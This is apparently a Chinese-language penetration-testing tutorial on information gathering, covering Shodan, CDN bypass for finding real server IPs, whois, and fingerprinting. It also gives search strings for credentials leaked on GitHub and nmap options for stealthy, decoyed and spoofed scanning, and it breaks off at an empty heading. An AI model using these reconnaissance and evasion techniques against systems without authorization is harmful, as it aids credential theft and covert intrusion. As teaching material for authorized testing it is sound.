前言\n\n方式：主动扫描，开放搜索等。\n\n开放搜索：利用搜索引擎获得：后台、未授权页面、敏感url、等等。\n\n基础信息：IP、网段、域名、端口。\n\n应用信息：各端口的应用。例如web应用、邮件应用、等等。\n\n系统信息：操作系统版本\n\n版本信息：所有这些探测到的东西的版本。\n\n服务信息：中间件的各类信息，插件信息。\n\n人员信息：域名注册人员信息，web应用中发帖人的id，管理员姓名等。\n\n防护信息：试着看能否探测到防护设备。\n\n![](img/1.png)\n\n逆向pwn ,逆向工程、web、移动\n\n主动信息收集：通过直接访问、扫描网站，这种流量将流经网站\n\n被动信息收集：利用第三方的服务对目标进行访问了解，比例： Shodan搜索等\n\n详见Shodan使用手册。\n\n# 在线搜索（Shodan）\n\nShodan 是一个搜索引擎，但它与 Google 这种搜索网址的搜索引擎不同，Shodan 是用来搜索网络空间中在线设备的，你可以通过 Shodan 搜索指定的设备，或者搜索特定类型的设备，其中 Shodan 上最受欢迎的搜索内容是：webcam，linksys，cisco，netgear，SCADA等等。\n\n\n在windows系统上访问Shodan只需要访问链接：https://www.shodan.io/\n\n## Shodan工作原理\n\n那么 Shodan 是怎么工作的呢？Shodan 通过扫描全网设备并抓取解析各个设备返回的 banner 信息，通过了解这些信息 Shodan 就能得知网络中哪一种 Web 服务器是最受欢迎的，或是网络中到底存在多少可匿名登录的 FTP 服务器，或者哪个ip对应的主机是哪种设备。\n\n## Shodan的使用\n\n我们在左上角输入我们要搜索的关键字，然后下面就出来搜索结果了。比如我们搜索 SSH\n![](img/2.png)\n上图的搜索结果包含两个部分，左侧是大量的汇总数据包括：\n```\nResults map – 搜索结果展示地图\nTop services (Ports) – 使用最多的服务/端口\nTop organizations (ISPs) – 使用最多的组织/ISP\nTop operating systems – 使用最多的操作系统\nTop products (Software name) – 使用最多的产品/软件名称\n```\n随后，在中间的主页面我们可以看到包含如下的搜索结果：\n```\nIP 地址\n主机名\nISP\n该条目的收录收录时间\n该主机位于的国家\nBanner 信息\n```\n想要了解每个条目的具体信息，只需要点击每个条目下方的 details 按钮即可。\n![](img/3.png)\n\n我们还可以点击 Exploits ，Shodan 就会帮我们查找针对不同平台、不同类型可利用的 exploits。当然也可以通过直接访问网址来自行搜索：[https://exploits.shodan.io/welcome；](https://exploits.shodan.io/welcome%EF%BC%9B)\n\n![](img/4.png)\n\n我们还可以点击Maps，查看设备分布的地图\n![](img/5.png)\n\n如果我们想生成报表，我们可以点击Create Report\n![](img/6.png)\n\n我们还可以直接点击 Explore ，看网络上其他用户使用最多的搜索\n![](img/7.png)\n如果像前面单纯只使用关键字直接进行搜索，搜索结果可能不尽人意，那么此时我们就需要使用一些特定的命令对搜索结果进行过滤。\n## 使用搜索过滤\n```\nhostname：搜索指定的主机或域名，例如hostname:\&quot;google\&quot;\nport：搜索指定的端口或服务，例如port:\&quot;21\&quot;\ncountry：搜索指定的国家，例如country:\&quot;CN\&quot;\ncity：搜索指定的城市，例如city:\&quot;Hefei\&quot;\norg：搜索指定的组织或公司，例如org:\&quot;google\&quot;\nisp：搜索指定的ISP供应商，例如isp:\&quot;China Telecom\&quot;\nproduct：搜索指定的操作系统/软件/平台，例如product:\&quot;Apache httpd\&quot;\nversion：搜索指定的软件版本，例如 version:\&quot;1.6.2\&quot;\ngeo：搜索指定的地理位置，参数为经纬度，例如 geo:\&quot;31.8639, 117.2808\&quot;\nbefore/after：搜索指定收录时间前后的数据，格式为 dd-mm-yy，例如 before:\&quot;11-11-15\&quot;\nnet：搜索指定的IP地址或子网，例如 net:\&quot;210.45.240.0/24\&quot;\nKali中安装 Shodan\n```\nShodan 是由官方提供的 Python 库\n\n## Kali中安装 Shodan\n\nShodan 是由官方提供的 Python 库\n\n安装命令：\n```\ngit clone https://github.com/achillean/shodan-python.git &amp;&amp; cd shodan-python\npython setup.py install\n```\n## Kali中Shodan的使用\n\n官方用法：Shodan Command-Line Interface\nCommands:\n```\nalert Manage the network alerts for your account # 管理账户的网络提示\nconvert Convert the given input data file into a... # 转换输入文件\ncount Returns the number of results for a search # 返回查询结果数量\ndownload Download search results and save them in a... # 下载查询结果到文件\nhoneyscore Check whether the IP is a honeypot or not. # 检查 IP 是否为蜜罐\nhost View all available information for an IP... # 显示一个 IP 所有可用的详细信息\ninfo Shows general information about your account # 显示账户的一般信息\ninit Initialize the Shodan command-line # 初始化命令行\nmyip Print your external IP address # 输出用户当前公网IP\nparse Extract information out of compressed JSON... # 解析提取压缩的JSON信息，即使用download下载的数据\nscan Scan an IP/ netblock using Shodan. # 使用 Shodan 扫描一个IP或者网段\nsearch Search the Shodan database # 查询 Shodan 数据库\nstats Provide summary information about a search... # 提供搜索结果的概要信息\nstream Stream data in real-time. # 实时显示流数据\n初始化Shodan：shodan init API_Key\n返回查询结果的数量：shodan  count  SSH\n```\n将查询到的结果下载：shodan download microsoft-data microsoft iis 6.0 。将搜索结果下载到  microsoft-data 文件中，文件中的每一行都是 JSON 格式存储的目标 banner 信息。默认情况下，该命令只会下载 100 条结果。如果我们想获取更多的结果，需要我们花钱注册，然后下载的时候指定--limit参数。\n![](img/8.png)\n解析下载的数据：shodan parse --fields ip_str,port,org --separator , microsoft-data.json.gz\n![](img/9.png)\n\n查看指定主机的相关信息，如地理位置信息，开放端口，甚至是否存在某些漏洞等信息。\n![](img/10.png)\nshodan search microsoft iis 6.0\nsearch查找，直接将查询结果展示在命令行中，默认情况下只显示IP、端口号、主机名和HTTP数据\n![](img/11.png)\n\n当然我们也可以通过使用 –fields 来自定义显示内容，例如，我们只显示IP、端口号、组织名称和主机名：\n```\nshodan search --fields ip_str,port,org,hostnames microsoft iis 6.0\n```\n![](img/12.png)\n\n## MSF中使用Shodan\n```\nuse auxiliary/gather/shodan_search #使用shodan模块\nset shodan_apikey xxxxxxxx #设置shodan的API\nset query JAWS/1.0 #设置查询词\nexploit\n```\n![](img/13.png)\n\n# 域名信息收集\n\n## 通过域名查询IP\n\n### 查询网站\n\n使用不同地方的 ping 服务，查看对应 IP 地址是否唯一，如果不唯一则极有可能是使用了CDN\n\nping测试网站有：\nhttps://wepcc.com/\nhttp://ping.chinaz.com/\nhttp://ping.aizhan.com/\n### 什么是CDN\n在渗透测试过程中，经常会碰到网站有CDN的情况。CDN即内容分发网络，主要解决因传输距离和不同运营商节点造成的网络速度性能低下的问题。说的简单点，就是一组在不同运营商之间的对接点上的高速缓存服务器，把用户经常访问的静态数据资源直接缓存到节点服务器上，当用户再次请求时，会直接分发到离用户近的节点服务器上响应给用户，当用户有实际数据交互时才会从远程Web服务器上响应，这样可以大大提高网站的响应速度及用户体验。\n#### 2.1.1.3 CDN的优势\n提高用户访问速率，优化用户使用体验。\n隐藏真实服务器的IP\n提供WAF功能，目前很多CDN也提供了WAF的功能，我们的访问请求会先经过CDN节点的过滤，该过滤可对SQL注入、XSS、Webshell上传、命令注入、恶意扫描等攻击行为进行有效检测和拦截。CDN节点将认为无害的数据提交给真实的主机服务器。\n### 几种访问方式的不同\n传统访问：用户访问域名--&gt;解析服务器IP--&gt;访问目标主机\n普通CDN：用户访问域名--&gt;CDN节点--&gt;真实服务器IP--&gt;访问目标主机\n带WAF的CDN：用户访问域名--&gt;CDN节点（云WAF）--&gt;真实服务器IP--&gt;访问目标主机\n### CDN的配置\n将域名的 NS 记录指向 CDN 厂商提供的 DNS 服务器。\n给域名设置一个 CNAME 记录，将它指向CDN厂商提供的另一个域名。\n所以在渗透测试中，为了要知道网站服务器的真实IP，我们必须绕过CDN查找出网站的真实ip地址。\n查询域名相关的网站：\n\n* DNS查询：https://dnsdb.io/zh-cn/\n* 微步在线：https://x.threatbook.cn/\n* 在线域名信息查询：http://toolbar.netcraft.com/site_report?url=\n* DNS、IP等查询：http://viewdns.info/\n* CDN查询IP：https://tools.ipip.net/cdn.php\n* SecurityTrails平台：https://securitytrails.com/domain/www.baidu.com/history/a\n\n## 绕过CDN的方法\n\n### 查询子域名\n\n通过爆破子域名进行查询，如 Layer子域名爆破机、subDomainBrute，在线子域名查询网站：https://phpinfo.me/domain/\n\n通过查询DNS服务器，查询该域下的解析记录\n\n通过HTTPS证书来查询(只适用于https网站) ，如：[https://crt.sh/就是通过https证书查询子域名](https://crt.sh/%E5%B0%B1%E6%98%AF%E9%80%9A%E8%BF%87https%E8%AF%81%E4%B9%A6%E6%9F%A5%E8%AF%A2%E5%AD%90%E5%9F%9F%E5%90%8D)\n\n通过google查询\n\n### 查询主域名\n\n以前用CDN的时候有个习惯，只让WWW域名使用cdn，秃域名不适用，为的是在维护网站时更方便，不用等cdn缓存。所以试着把目标网站的www去掉，ping一下看ip是不是变了，您别说，这个方法还真是屡用不爽。\n\n### 邮件服务器\n\n一般的邮件系统都在内部，没有经过CDN的解析，通过目标网站用户注册或者RSS订阅功能，查看邮件，寻找邮件头中的邮件服务器域名IP，ping这个邮件服务器的域名，就可以获得目标的真实IP(必须是目标自己的邮件服务器，第三方或者公共邮件服务器是没有用的)。\n\n### 查看域名历史解析记录\n\n也许目标很久之前没有使用CDN，所以可能会存在使用 CDN 前的记录。所以可以通过网站https://www.netcraft.com 来观察域名的IP历史记录。\n\n#### 国外访问\n\n国内的CDN往往只对国内用户的访问加速，而国外的CDN就不一定了。因此，通过国外在线代理网站https://asm.ca.com/en/ping.php 访问 ，可能会得到真实的ip地址。\n\n### Nslookup查询\n查询域名的NS记录、MX记录、TXT记录等很有可能指向的是真实ip或同C段服务器。\n各种解析记录\n* A 主机记录，记录域名对应的ip\n* PTR 反向地址解析记录，记录ip对应的域名\n* CNAME 别名记录\n* MX 邮箱交换记录\n* NS 服务器记录\n* SOA 权威记录\n* TXT 为记录说明\n* SRV 列出了正在提供特定服务的服务器\n* AAAA ipv6地址记录\nA (Address) 记录也叫主机记录，是用来指定域名对应的IP地址记录。用户可以将该域名下的网站服务器指向到自己的网页服务器(web server)上。同时也可以设置域名的子域名。通俗来说A记录就是服务器的IP，域名绑定A记录就是告诉DNS，当输入域名的时候给你引导向设置在DNS的A记录所对应的服务器。在命令行下可以通过nslookup -qt=a www.baidu.com来查看A记录。\n![](img/14.png)\n\n### 网站漏洞\n\n利用网站自身存在的漏洞，很多情况下会泄露服务器的真实IP地址\n\n### Censys查询SSL证书找到真实IP\n\n利用“Censys网络空间搜索引擎”搜索网站的SSL证书及HASH，在[https://crt.sh上查找目标网站SSL证书的HASH](https://crt.xn--shSSLHASH-rb6nx5at77oxxownaz80pknbhz7al4su67c)，然后再用Censys搜索该HASH即可得到真实IP地址。\n\n## 域名的whois信息\n\nwhois是用来查询域名注册所有者等信息的传输协议。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。通过whois来实现对域名信息的查询。早期的whois查询多以命令行接口存在，但是现在出现了一些网页接口简化的线上查询工具，可以一次向不同的数据库查询。网页接口的查询工具仍然依赖whois协议向服务器发送查询请求，命令行接口的工具仍然被系统管理员广泛使用。whois通常使用TCP协议43端口。每个域名/IP的whois信息由对应的管理机构保存。\n\n查询的网站：http://whois.chinaz.com/\n\n# 公司敏感信息收集\n\n当确定了公司后，我们可以去互联网上查询与该公司有关的任何信息。比如，公司的邮箱格式，公司的员工姓名，以及与该公司有关的任何信息。并且，我们还可以去Github、码云等代码托管平台上查找与此有关的敏感信息，有些粗心的程序员在将代码上传至代码托管平台后，并没有对代码进行脱敏处理。导致上传的代码中有包含如数据库连接信息、邮箱密码、还有可能有泄露的源代码等。\n\n在渗透测试的信息收集阶段，可以去Github和码云上搜索与目标有关的信息，或者就有意想不到的收获。(有些开发人员将代码上传到代码库的时候，有可能连一些重要的配置信息也上传了)\n\n## Github的搜索\n\n访问[https://github.com/；Github的搜索语法：](https://github.com/%EF%BC%9BGithub%E7%9A%84%E6%90%9C%E7%B4%A2%E8%AF%AD%E6%B3%95%EF%BC%9A)\n```\nin:name test #仓库标题搜索含有关键字 SpringCloud\nin:descripton test #仓库描述搜索含有关键字\nin:readme test #Readme文件搜素含有关键字\nstars:&gt;3000 test #stars数量大于3000的搜索关键字\nstars:1000..3000 test #stars数量大于1000小于3000的搜索关键字\nforks:&gt;1000 test #forks数量大于1000的搜索关键字\nforks:1000..3000 test #forks数量大于1000小于3000的搜索关键字\nsize:&gt;=5000 test #指定仓库大于5000k(5M)的搜索关键字\npushed:&gt;2019-02-12 test #发布时间大于2019-02-12的搜索关键字\ncreated:&gt;2019-02-12 test #创建时间大于2019-02-12的搜索关键字\nuser:test #用户名搜素\nlicense:apache-2.0 test #明确仓库的 LICENSE 搜索关键字\nlanguage:java test #在java语言的代码中搜索关键字\nuser:test in:name test #组合搜索,用户名test的标题含有test的\n```\n## 使用 Github 进行邮件配置信息收集\n\n很多网站及系统都会使用 pop3 和 smtp 发送来邮件，不少开发者由于安全意识不足会把相关的配置信息也放到Github上，所以如果这时候我们动用一下google搜索命令语句，构造一下关键字，就能把这些信息给找出来了。\n```\nsite:Github.com smtp\nsite:Github.com smtp @qq.com\nsite:Github.com smtp @126.com\nsite:Github.com smtp @163.com\nsite:Github.com smtp @sina.com.cn\nsite:Github.com smtp password\nsite:Github.com String password smtp\n……\n```\n我们也可以锁定域名搜索结合厂商域名 灵活运用例如搜百度的\n`site:Github.com smtp @baidu.com`\n\n## 使用Github进行数据库信息收集\n```\nsite:Github.com sa password\nsite:Github.com root password\nsite:Github.com User ID=’sa’;Password\nsite:Github.com inurl:sql\n```\n## 使用Github进行 SVN 信息收集\n```\nsite:Github.com svn\nsite:Github.com svn username\nsite:Github.com svn password\nsite:Github.com svn username password\n```\n## 使用Github进行综合信息收集\n```\nsite:Github.com password\nsite:Github.com ftp ftppassword\nsite:Github.com 密码\n```\n# 网站指纹识别\n\n在渗透测试中，对目标服务器进行指纹识别是相当有必要的，因为只有识别出相应的Web容器或者CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。CMS又称整站系统。常见的CMS有：WordPress、Dedecms、Discuz、PhpWeb、PhpWind、Dvbbs、PhpCMS、ECShop、、SiteWeaver、AspCMS、帝国、Z-Blog等。\n常见的网站指纹识别工具有：whatweb等。\n在线指纹识别网站：\n* BugScaner：http://whatweb.bugscaner.com/look/\n* 云悉指纹：http://www.yunsee.cn/finger.html\n* WhatWeb：https://whatweb.net/\n\n# 整站分析\n\n## 服务器类型（Linux/windows）\n\n判断是Linux还是Windows最简单就是通过ping来探测，Windows的TTL值都是一般是128，Linux则是64。所以大于100的肯定是Windows，而几十的肯定是Linux。但是，通过TTL值来判断服务器类型也不是百分之百准确的\n\n而判断目标网站服务器的具体的版本的话，可以采用 nmap 进行扫描， -O 和 -A 参数都能扫描出来\n\n## 网站容器（Apache/Nginx/Tomcat/IIS）\n\n知道了这些信息之后，我们就需要知道网站用的web服务器是什么类型的：Apache、Nginx、Tomcat 还是 IIS。知道了web服务器是哪种类型后，我们还要探测web服务器具体的版本。比如Ngnix版本&lt;0.83会有解析漏洞 ，IIS6.0会有文件名解析漏洞、IIS7.0会有畸形解析漏洞等。不同的web服务器版本，存在着不同漏洞\n\n## 脚本类型（php/jsp/asp/aspx）\n\n我们需要知道网站用的脚本类型：php 、Jsp 、Asp 、Aspx 。\n\n1. 可以根据网站URL来判断\n\n2. site:xxx filetype:php\n\n3. 可以根据Firefox的插件来判断\n\n## 数据库类型（Mysql/Oracle/Access/SQLserver）\n\n我们需要知道网站用的是哪种类型的数据库：Mysql、Oracle、SqlServer 还是 Access 。虽然这几种数据库的语法大体上相同，但是还是有区别的。所以我们还是要知道目标网站用的是哪种数据库，并且数据库是哪个版本的\n\n几种数据库的区别:\n\n* Access 全名是Microsoft Office Access，是由微软发布的关联式数据库管理系统。小型数据库，当数据库达到100M左右的时候性能就会下降。数据库后缀名： .mdb   一般是asp的网页文件用access数据库\n\n* SQL Server是由Microsoft开发和推广的关系数据库管理系统（DBMS），是一个比较大型的数据库。端口号为1433。数据库后缀名 .mdf\n\n* MySQL 是一个关系型数据库管理系统，由瑞典MySQL AB 公司开发，目前属于 Oracle 旗下产品。MySQL是最流行的关系型数据库管理系统，在 WEB 应用方面MySQL是最好的应用软件之一，MySQL数据库大部分是php的页面。默认端口是3306\n\n* Oracle又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。常用于比较大的网站。默认端口是1521\n\n首先，成本上的差距，access是不要钱的，mysql也是开源的，sql server 是收费的一般也就几千，Oracle的费用则数万。其次，处理能力，access支持千以内的访问量，sql server支持几千到上万的访问，而Oracle则支持海量的访 问。再次，从数据库的规模来看，access是小型数据库，，mysql 是中小型数据库，sql server是中型数据库，Oracle是大型数据库。\n\n常见搭配：\n\n* ASP 和 ASPX：ACCESS、SQL Server\n\n* PHP：MySQL、PostgreSQL\n\n* JSP：Oracle、MySQL\n\n# 第六章主机扫描\n\n对目标主机进行扫描，而不仅仅是对网站进行扫描，扫描目标主机开放了哪些端口，扫描端口运行的服务，目标主机上有哪些漏洞。\n\n主机扫描的工具也有很多，比如：Nessus、AWVS\n\n\n# 第七章端口扫描（nmap）\n\n需要知道目标服务器开放了哪些端口，常见的如 135 、137 、138 、139 、445，这几个端口经常爆发漏洞。以下是一些服务端口的漏洞：\n\n* 22——&gt;ssh弱口令\n* 873——&gt;rsync未授权访问漏洞\n* 306——&gt;mysql弱口令\n* 6379——&gt;redis未授权访问漏洞\n端口扫描工具有nmap和masscan。nmap扫描的准确性较高，但是扫描的比较慢。masscan扫描的比较快，但是准确性较低。\nmasscan示例 ：\n```\nmasscan 192.168.10.152 -p 0-65535 --rate=10000\n```\n## nmap简介\n\nnmap四项基本功能：\n1. 主机发现 (Host Discovery)\n\\-sn,-PE/PP/PM\n2. 端口扫描 (Port Scanning)\n\\-sS,-sT,-sA, -sN/sF/sX,-sU, -sY/-sZ\n3. 版本侦测 (Version Detection)\n\\-sV（可查看自定义的端口服务）\n4. 操作系统侦测 (Operating System Detection)\n\\-O，-osscan-limit,-osscan-guess,\n而在这四项功能的基础上，nmap还提供防火墙和 IDS 的规避技巧，可以综合运用到四个基本功能的各个阶段。另外nmap还提供强大的NSE(Nmap Scripting Language)脚本引擎功能，脚本可以对基本功能进行补充和扩展。\n**nmap参数**\n\nnmap –iflist : 查看本地主机的接口信息和路由信息\n\n\\-A ：选项用于使用进攻性方式扫描\n\n\\-T4： 指定扫描过程使用的时序，总有6个级别（0-5），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况较好的情况下推荐使用T4\n\n\\-oX test.xml： 将扫描结果生成 test.xml 文件，如果中断，则结果打不开\n\n\\-oA test.xml: 将扫描结果生成 test.xml 文件，中断后，结果也可保存\n\n\\-oG test.txt: 将扫描结果生成 test.txt 文件\n\n\\-sn : 只进行主机发现，不进行端口扫描\n\n\\-O : 指定Nmap进行系统版本扫描\n\n\\-sV: 指定让Nmap进行服务版本扫描\n\n\\-p &amp;lt;port ranges&amp;gt;: 扫描指定的端口\n\n\\-sS/sT/sA/sW/sM:指定使用 TCP SYN/Connect()/ACK/Window/Maimon scans的方式来对目标主机进行扫描\n\n\\-sU: 指定使用UDP扫描方式确定目标主机的UDP端口状况\n\n\\-script &amp;lt;script name&amp;gt; : 指定扫描脚本\n\n\\-Pn ： 不进行ping扫描\n\n\\-sP : 用ping扫描判断主机是否存活，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping\n\n\\-PI : 设置这个选项，让nmap使用真正的ping(ICMP echo请求)来扫描目标主机是否正在运行。\n\n\\-iL 1.txt : 批量扫描1.txt中的目标地址\n\n\\-sL: List Scan 列表扫描，仅将指定的目标的IP列举出来，不进行主机发现\n\n\\-sY/sZ: 使用SCTP INIT/COOKIE-ECHO来扫描SCTP协议端口的开放的情况\n\n\\-sO: 使用IP protocol 扫描确定目标机支持的协议类型\n\n\\-PO : 使用IP协议包探测对方主机是否开启\n\n\\-PE/PP/PM : 使用ICMP echo、 ICMP timestamp、ICMP netmask 请求包发现主机\n\n\\-PS/PA/PU/PY : 使用TCP SYN/TCP ACK或SCTP INIT/ECHO方式进行发现\n\n\\-sN/sF/sX: 指定使用TCP Null, FIN, and Xmas scans秘密扫描方式来协助探测对方的TCP端口状态\n\n\\-e eth0：指定使用eth0网卡进行探测\n\n\\-f : --mtu &amp;lt;val&amp;gt;: 指定使用分片、指定数据包的 MTU.\n\n\\-b &amp;lt;FTP relay host&amp;gt;: 使用FTP bounce scan扫描方式\n\n\\-g： 指定发送的端口号\n\n\\-r: 不进行端口随机打乱的操作（如无该参数，nmap会将要扫描的端口以随机顺序方式扫描，以让nmap的扫描不易被对方防火墙检测到）\n\n\\-v 表示显示冗余信息，在扫描过程中显示扫描的细节，从而让用户了解当前的扫描状态\n\n\\-n : 表示不进行DNS解析；\n\n\\-D &amp;lt;decoy1,decoy2\\[,ME\\],...&amp;gt;: 用一组 IP 地址掩盖真实地址，其中 ME 填入自己的 IP 地址\n\n\\-R ：表示总是进行DNS解析。\n\n\\-F : 快速模式，仅扫描TOP 100的端口\n\n\\-S &amp;lt;IP_Address&amp;gt;: 伪装成其他 IP 地址\n\n\\--ttl &amp;lt;val&amp;gt;: 设置 time-to-live 时间\n\n\\--badsum: 使用错误的 checksum 来发送数据包（正常情况下，该类数据包被抛弃，如果收到回复，说明回复来自防火墙或 IDS/IPS）\n\n\\--dns-servers : 指定DNS服务器\n\n\\--system-dns : 指定使用系统的DNS服务器\n\n\\--traceroute : 追踪每个路由节点\n\n\\--scanflags &amp;lt;flags&amp;gt;: 定制TCP包的flags\n\n\\--top-ports &amp;lt;number&amp;gt; :扫描开放概率最高的number个端口\n\n\\--port-ratio &amp;lt;ratio&amp;gt;: 扫描指定频率以上的端口。与上述--top-ports类似，这里以概率作为参数\n\n\\--version-trace: 显示出详细的版本侦测过程信息\n\n\\--osscan-limit: 限制Nmap只对确定的主机的进行OS探测（至少需确知该主机分别有一个open和closed的端口）\n\n\\--osscan-guess: 大胆猜测对方的主机的系统类型。由此准确性会下降不少，但会尽可能多为用户提供潜在的操作系统\n\n\\--data-length &amp;lt;num&amp;gt;: 填充随机数据让数据包长度达到 Num\n\n\\--ip-options &amp;lt;options&amp;gt;: 使用指定的 IP 选项来发送数据包\n\n\\--spoof-mac &amp;lt;mac address/prefix/vendor name&amp;gt; : 伪装 MAC 地址\n\n\\--version-intensity &amp;lt;level&amp;gt;: 指定版本侦测强度（0-9），默认为7。数值越高，探测出的服务越准确，但是运行时间会比较长。\n\n\\--version-light: 指定使用轻量侦测方式 (intensity 2)\n\n\\--version-all: 尝试使用所有的probes进行侦测 (intensity 9)\n\n\\--version-trace: 显示出详细的版本侦测过程信息\n\nnmap 192.168.1.0/24 -exclude 192.168.1.10 #扫描除192.168.1.0外的该网段的其他地址\n\nnmap 192.168.1.0/24 -excludefile f:/1.txt #扫描除给定文件中的地址以外的其他地址\n\n\n## nmap基本功能\n\n### 探测目标主机是否在线\n\n##### 当探测公网IP时\n\n**nmap –sn**\n\nNmap会发送四种不同类型的数据包来探测目标主机是否在线。\n\n&amp;nbsp;\n\nICMP echo request\n\na TCP SYN packet to port 443(https)\n\na TCP ACK packet to port 80(http)\n\nan ICMP timestamp request\n\n依次发送四个报文探测目标机是否开启。只要收到其中一个包的回复，那就证明目标机开启。使用四种不同类型的数据包可以避免因防火墙或丢包造成的判断错误\n\n\n**nmap -PE/-PP/-PM**\n\n\\-PE 的ICMP Echo扫描简单来说是通过向目标发送ICMP Echo数据包来探测目标主机是否存活，但由于许多主机的防火墙会禁止这些报文，所以仅仅ICMP扫描通常是不够的。\n\n\\-PP 的ICMP time stamp时间戳扫描在大多数防火墙配置不当时可能会得到回复，可以以此方式来判断目标主机是否存活。倘若目标主机在线，该命令还会探测其开放的端口以及运行的服务\n\n\\-PM 的ICMP address maskPing[\\[S6\\]](# \&quot;#_msocom_6\&quot;) 地址掩码扫描会试图用备选的ICMP等级Ping指定主机，通常有不错的穿透防火墙的效果\n\n\n##### 当探测内网IP时\n\n**nmap -sn**\n\n使用 nmap  -sn  内网ip   这个命令会发送arp请求包探测目标ip是否在线，如果有arp回复包，则说明在线。此命令可以探测目标主机是否在线，如果在线，还可以得到其MAC地址。但是不会探测其开放的端口号。\n\n**nmap -PE/-PP/-PM**\n\n使用nmap -PE/PP/PM  内网ip 探测主机的开启情况，使用的是ARP请求报文，如果有ARP回复报文，说明主机在线。-PP/PE/PM命令探测到主机在线后，还会探测主机的端口的开启状态以及运行的服务\n\n### 7.2.2 端口扫描及原理\n\n##### 原理\n\n端口扫描是Nmap最基本最核心的功能，用于确定目标主机的TCP/UDP端口的开放情况。\n\n默认情况下，Nmap会扫描1000个最有可能开放的TCP端口\n\nNmap通过探测将端口划分为6个状态：\n\nopen：端口是开放的。\n\nclosed：端口是关闭的。\n\nfiltered：端口被防火墙IDS/IPS屏蔽，无法确定其状态。\n\nunfiltered：端口没有被屏蔽，但是否开放需要进一步确定。\n\nopen|filtered：端口是开放的或被屏蔽，Nmap不能识别。\n\nclosed|filtered ：端口是关闭的或被屏蔽，Nmap不能识别\n\n**TCP SYN** **扫描(-sS)**\n\n这是Nmap默认的扫描方式，通常被称作半开放扫描。该方式发送SYN到目标端口，如果收到SYN/ACK回复，那么可以判断端口是开放的；如果收到RST包，说明该端口是关闭的。如果没有收到回复，那么可以判断该端口被屏蔽了。因为该方式仅发送SYN包对目标主机的特定端口，但不建立完整的TCP连接，所以相对比较隐蔽，而且效率比较高，适用范围广。\n\n**TCP connent** **扫描(-sT)**\n\nTCP connect方式使用系统网络API connect向目标主机的端口发起连接，如果无法连接，说明该端口关闭。该方式扫描速度比较慢，而且由于建立完整的TCP连接会在目标主机上留下记录信息，不够隐蔽。所以，TCP connect是TCP SYN无法使用才考虑使用的方式\n\n**TCP ACK** **扫描(-sA)**\n\n向目标主机的端口发送ACK包，如果收到RST包，说明该端口没有被防火墙屏蔽；没有收到RST包，说明被屏蔽。**该方式只能用于确定防火墙是否屏蔽某个端口**，可以辅助TCP SYN的方式来判断目标主机防火墙的状况\n\n**TCP FIN/Xmas/NULL** **扫描(-sN/sF/sX)**\n\n这三种扫描方式被称为秘密扫描，因为相对比较隐蔽。FIN扫描向目标主机的端口发送的TCP FIN 包或Xmas tree包或NULL包，如果收到对方的RST回复包，那么说明该端口是关闭的；没有收到RST包说明该端口可能是开放的或者被屏蔽了。其中Xmas tree包是指flags中FIN URG PUSH被置为1的TCP包；NULL包是指所有的flags都为0的TCP包。\n\n**UDP\\*\\*\\*\\*扫描(-sU)**\n\nUDP扫描用于判断UDP端口的情况，向目标主机的UDP端口发送探测包，如果收到回复ICMP port unreachable就说明该端口是关闭的；如果没有收到回复，那说明该UDP端口可能是开放的或者屏蔽的。因此，通过反向排除法的方式来判断哪些UDP端口是可能处于开放状态的。\n\n**其他方式(-sY/-sZ)**\n\n除了以上几种常用的方式外，Nmap还支持多种其他的探测方式。例如使用SCTP INIT/Cookie-ECHO方式是来探测SCTP的端口开放情况；使用IP protocol方式来探测目标主机支持的协议类型(tcp/udp/icmp/sctp等等)；使用idle scan方式借助僵尸主机来扫描目标主机，以达到隐蔽自己的目的；或者使用FTP bounce scan，借助FTP允许的代理服务扫描其他的主机，同样达到隐蔽自己的目的\n\n##### 简单扫描（nmap ip）\n\n例如： nmap 202.207.236.2这个命令会按照 nmap-services 文件中指定的端口进行扫描，然后列出目标主机开放的端口号，以及端口号上运行的服务。在一次简单扫描中，Nmap会以默认TCP SYN扫描方式进行，仅判断目标端口是否开放，若开放，则列出端口对应的服务名称。\n\n**探测端口开放过程**：确定主机在线之后，nmap会按照nmap-services文件中的端口号发送TCP SYN报文给主机相应的端口，如果主机回复一个包含TCP SYN、ACK的报文，则说明该端口号开放。nmap会再回复一个TCP RST清除连接复位。下面的截图是nmap是和目标主机的80号端口的探测过程，由此可见，目标主机的22号端口属于开放状态\n![](img/16.png)\n##### 全面扫描(nmap -A ip)\n\n进攻式扫描（慎用）\n\n例如：nmap -A 202.207.236.2 这个命令不仅列出目标主机开放的端口号，对应的服务，还较为详细的列出了服务的版本，其支持的命令,到达目标主机的每一跳路由等信息。在进行完全扫描时，扫描机与目标主机之间存在大量的数据流量交互，扫描时长随之增加。完全扫描不仅仅是TCP协议上的通信交互，还有例如ICMP、HTTP、NBSS、TDS、POP等等协议的交互，这些协议的交互是因为在完全扫描开始时首先对目标主机的开放端口进行了确认，之后再根据不同对应的不同服务进行服务版本信息探测、账户信息等信息的探测！\n![](img/15.png)\n全面扫描时数据流量包的截图，确定了哪些端口的协议开启了之后，进行更加深入的探测！\n![](img/17.png)\n\n##### 探测指定端口的开放状态\n```\nnmap -p 80-445 10.96.10.246 扫描目标主机的80-445端口的开放情况\nnmap -sS -sU --top-ports 100 10.96.10.246 \n```\n参数-sS表示使用TCP SYN方式扫描TCP端口；-sU表示扫描UDP端口；--top-ports 100表示扫描最有可能开放的100个端口（TCP和UDP分别100个端口）。\n\n### 7.2.3 版本侦测\n\n版本侦测，用于确定目标主机开放端口上运行的具体的应用程序及版本信息。\n\nNmap提供的版本侦测具有如下的优点：\n* 高速。并行地进行套接字操作，实现一组高效的探测匹配定义语法。\n* 尽可能地确定应用名字与版本名字。\n* 支持TCP/UDP协议，支持文本格式与二进制格式。\n* 支持多种平台服务的侦测，包括Linux/Windows/Mac OS/FreeBSD等系统。\n* 如果检测到SSL，会调用openSSL继续侦测运行在SSL上的具体协议（如HTTPS/POP3S/IMAPS）。\n* 如果检测到SunRPC服务，那么会调用brute-force RPC grinder进一步确定RPC程序编号、名字、版本号。\n* 支持完整的IPv6功能，包括TCP/UDP，基于TCP的SSL。\n* 通用平台枚举功能（CPE）\n* 广泛的应用程序数据库（nmap-services-probes）。目前Nmap可以识别几千种服务的签名，包含了180多种不同的协议。\n\n##### 